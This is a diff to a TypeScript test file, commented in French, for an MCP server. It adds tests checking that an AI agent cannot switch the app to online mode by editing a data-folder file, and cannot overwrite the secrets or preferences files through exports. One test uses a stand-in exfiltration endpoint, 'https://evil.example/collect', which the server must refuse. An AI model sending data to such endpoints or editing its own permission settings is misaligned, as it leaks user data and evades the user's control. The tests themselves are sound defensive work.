@@ -11,6 +11,7 @@ import { FileStore } from '../file-store'
 const root = path.resolve(import.meta.dirname, '..', '..')
 const server = path.join(root, 'dist-desktop', 'atelier-mcp.mjs')
 let dir: string
+let configDir: string
 let client: Client
 
 type TextResult = { isError?: boolean; content: { type: string; text: string }[] }
@@ -33,6 +34,8 @@ beforeAll(async () => {
     stdio: 'ignore',
   })
   dir = fs.mkdtempSync(path.join(os.tmpdir(), 'atelier-mcp-'))
+  // Fichiers de secrets et de préférences : hors du dossier de données (SUITE.md §5.1).
+  configDir = `${dir}-config`
   new FileStore({ dir }).save(createDemoData())
   client = new Client({ name: 'test', version: '1.0.0' })
   await client.connect(
@@ -42,7 +45,7 @@ beforeAll(async () => {
       env: {
         ...process.env,
         ATELIER_TAB_DATA: dir,
-        ATELIER_TAB_SECRETS: `${dir}-secrets.json`,
+        ATELIER_TAB_SECRETS: path.join(configDir, 'secrets.json'),
       } as Record<string, string>,
     }),
   )
@@ -51,15 +54,16 @@ beforeAll(async () => {
 afterAll(async () => {
   await client?.close()
   fs.rmSync(dir, { recursive: true, force: true })
+  fs.rmSync(configDir, { recursive: true, force: true })
 })
 
 describe('serveur MCP', () => {
-  it('se présente avec des instructions et 15 outils', async () => {
+  it('se présente avec des instructions et 16 outils', async () => {
     expect(client.getServerVersion()?.name).toBe('atelier-tab')
     expect(client.getInstructions()).toMatch(/list_tables puis read_table/)
     expect(client.getInstructions()).toMatch(/Instantanés lus par Atelier Viz/)
     const { tools } = await client.listTools()
-    expect(tools).toHaveLength(15)
+    expect(tools).toHaveLength(16)
     expect(tools.find((t) => t.name === 'set_cells')?.inputSchema.required).toEqual([
       'table',
       'cells',
@@ -128,5 +132,54 @@ describe('serveur MCP', () => {
     expect(res.isError).toBe(false)
     expect(res.json.name).toBe('Budget Global')
     expect(res.notes[0]).toMatch(/fichiers invalides ignorés[\s\S]*tbl_calculs_surfaces\.json/)
+  })
+
+  it('mode « En ligne » : éditer atelier.json ne passe pas en ligne (SUITE.md §5.1)', async () => {
+    expect((await call('get_settings')).json).toMatchObject({ online_mode: false })
+    const file = path.join(dir, 'atelier.json')
+    const index = JSON.parse(fs.readFileSync(file, 'utf8'))
+    expect(index).not.toHaveProperty('preferences')
+    // Une IA (ou un humain) écrit l'ancien réglage dans le dossier de données : ignoré.
+    for (const preferences of [{ onlineMode: true }, { online_mode: true }]) {
+      fs.writeFileSync(file, JSON.stringify({ ...index, preferences }, null, 2))
+      expect((await call('get_settings')).json).toMatchObject({
+        online_mode: false,
+        mode: 'Hors ligne',
+      })
+    }
+    // Un envoi vers l'extérieur reste refusé, et rien n'est écrit dans les préférences.
+    await call('configure_export', { url: 'https://evil.example/collect' })
+    const send = await call('export_table', { table: 'Planning & Lots', format: 'webhook' })
+    expect(send.isError).toBe(true)
+    expect(send.text).toMatch(/Mode hors ligne : envoi vers evil\.example refusé/)
+    expect(fs.existsSync(path.join(configDir, 'preferences.json'))).toBe(false)
+    // Le réglage écrit dans atelier.json disparaît à la prochaine écriture de l'index.
+    await call('create_project', { workspace: 'Espace Architecture', name: 'Projet MCP' })
+    expect(JSON.parse(fs.readFileSync(file, 'utf8'))).not.toHaveProperty('preferences')
+    // Aucun outil ne permet de passer en ligne ou hors ligne.
+    const { tools } = await client.listTools()
+    expect(tools.map((t) => t.name).filter((n) => /online|mode|setting/i.test(n))).toEqual([
+      'get_settings',
+    ])
+  })
+
+  it('lit le mode « En ligne » choisi dans l’app (fichier de préférences), sans pouvoir l’écrire', async () => {
+    const prefs = path.join(configDir, 'preferences.json')
+    fs.mkdirSync(configDir, { recursive: true })
+    fs.writeFileSync(prefs, JSON.stringify({ onlineMode: true }))
+    expect((await call('get_settings')).json).toMatchObject({ online_mode: true, mode: 'En ligne' })
+    // Un export en fichier ne peut pas écraser les préférences (ni les secrets).
+    for (const target of [prefs, path.join(configDir, 'secrets.json')]) {
+      const res = await call('export_table', {
+        table: 'Planning & Lots',
+        format: 'json',
+        path: target,
+      })
+      expect(res.isError).toBe(true)
+      expect(res.text).toMatch(/fichier réservé aux réglages/)
+    }
+    expect(JSON.parse(fs.readFileSync(prefs, 'utf8'))).toEqual({ onlineMode: true })
+    fs.writeFileSync(prefs, JSON.stringify({ onlineMode: false }))
+    expect((await call('get_settings')).json).toMatchObject({ online_mode: false })
   })
 })
